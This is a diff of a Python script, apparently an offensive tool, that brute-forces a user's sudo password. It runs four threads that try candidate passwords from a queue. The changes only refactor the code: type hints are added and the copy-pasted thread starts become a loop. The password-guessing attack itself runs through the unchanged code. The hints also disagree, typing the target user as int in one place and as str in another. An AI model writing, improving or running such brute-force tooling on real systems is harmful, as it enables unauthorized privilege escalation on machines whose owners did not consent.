@@ -1,4 +1,4 @@
-from subprocess import PIPE,Popen, DEVNULL
+from subprocess import PIPE,Popen,DEVNULL
 from sys import argv
 import queue
 import threading
@@ -12,7 +12,7 @@ def check_file(possible_path: str)-> list[bytes]:
         return [bytes(possible_path,'utf-8')]
 
 class bruterThread(threading.Thread):
-    def __init__(self, threadID, targetUser, passwdq):
+    def __init__(self, threadID: int, targetUser: int, passwdq):
         threading.Thread.__init__(self)
         self.threadID = threadID
         self.tuser = targetUser
@@ -21,7 +21,7 @@ class bruterThread(threading.Thread):
     def run(self):
         sudo_bruteforce(self.threadID,self.tuser, self.passwdq)
 
-def sudo_bruteforce(id, user, passwdq):
+def sudo_bruteforce(id: int, user: str, passwdq):
     global finishedFlag
 
     while not finishedFlag and not passwdq.empty():
@@ -51,26 +51,12 @@ def main():
         for password in passwords:
             passwordQueue.put(password)
         
-        #Add more threads
-        thread1 = bruterThread(1, user, passwordQueue)
-        thread1.start()
-        threads.append(thread1)
-        print("starting thread 1")
-
-        thread2 = bruterThread(2, user, passwordQueue)
-        thread2.start()
-        threads.append(thread2)
-        print("starting thread 2")
-
-        thread3 = bruterThread(3, user, passwordQueue)
-        thread3.start()
-        threads.append(thread3)
-        print("starting thread 3")
-
-        thread4 = bruterThread(4, user, passwordQueue)
-        thread4.start()
-        threads.append(thread4)
-        print("starting thread 4")
+        #Add more threads?
+        for i in range(1,5,1):
+            threadx = bruterThread(i, user, passwordQueue)
+            print(f"starting thread# {i}")
+            threadx.start()
+            threads.append(threadx)
 
         for t in threads:
             t.join()
